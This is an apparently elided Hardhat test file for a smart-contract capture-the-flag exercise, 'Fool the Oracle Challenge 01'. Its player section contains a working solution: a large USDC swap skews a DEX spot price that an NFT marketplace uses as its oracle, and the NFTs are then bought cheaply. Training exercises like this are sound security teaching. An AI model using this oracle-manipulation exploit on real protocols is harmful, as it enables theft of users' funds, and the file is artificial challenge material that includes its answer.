...
describe("Fool the Oracle Challenge 01", function () {
  ...
  before("Set up the challenge", async function () {
    ...
    await simpleDEX.addLiquidity(INITIAL_LIQUIDITY_USDC, {
    ...
    console.log(
      `ETH liquidity: ${ethers.formatEther(INITIAL_LIQUIDITY_ETH)} ETH`
    );
    console.log(
      `USDC liquidity: ${ethers.formatEther(INITIAL_LIQUIDITY_USDC)} USDC`
    );
    const initialPrice = await simpleDEX.getCurrentUsdcToEthPrice();
    console.log(
      `Initial exchange rate: 1 ETH = ${ethers.formatEther(initialPrice)} USDC`
    );
    ...
    console.log(
      `All ${listedCount} FEL Student NFTs are available for purchase in the marketplace.`
    );
    ...
    expect(await usdcToken.balanceOf(player.address)).to.equal(
      PLAYER_INITIAL_USDC
    );

    // Calculate player's total assets in ETH equivalent
    const playerUsdcInEth =
      (PLAYER_INITIAL_USDC * BigInt(1e18)) / BigInt(initialPrice);
    const playerTotalEthValue =
      BigInt(PLAYER_INITIAL_ETH) + BigInt(playerUsdcInEth);

    console.log(`\nPlayer's starting assets:`);
    console.log(`- ETH: ${ethers.formatEther(PLAYER_INITIAL_ETH)} ETH`);
    console.log(
      `- USDC: ${ethers.formatEther(
        PLAYER_INITIAL_USDC
      )} USDC (worth ${ethers.formatEther(playerUsdcInEth)} ETH)`
    );
    console.log(
      `- Total value: ${ethers.formatEther(playerTotalEthValue)} ETH equivalent`
    );
  });

  it("Execution of the player's code", async function () {
    // Approve USDC spending in the DEX
    await usdcToken
      .connect(player)
      .approve(simpleDEX.target, PLAYER_INITIAL_USDC);

    // Swap a large amount of USDC to ETH to make the price of USDC go down
    await simpleDEX.connect(player).usdcToEth(PLAYER_INITIAL_USDC);

    // Verify the new exchange rate is manipulated
    const manipulatedPrice = await simpleDEX.getCurrentUsdcToEthPrice();
    console.log(
      `Manipulated price: 1 ETH = ${ethers.formatEther(manipulatedPrice)} USDC`
    );

    // Purchase all NFTs using the manipulated exchange rate
    for (let i = 1; i <= NFT_COUNT; i++) {
      // Calculate current ETH price for the NFT
      const ethPrice = await nftMarketplace.getCurrentPriceForNFT(i);
      console.log(
        `Purchasing NFT #${i} for ${ethers.formatEther(ethPrice)} ETH`
      );
  ...
  after("Success conditions", async function () {
    ...
    console.log(`\n=== ATTACK RESULTS ===`);
    console.log(
      `Player's final ETH balance: ${ethers.formatEther(
        playerFinalBalance
      )} ETH`
    );
    console.log(
      `Player's final USDC balance: ${ethers.formatEther(
        finalUsdcBalance
      )} USDC`
    );
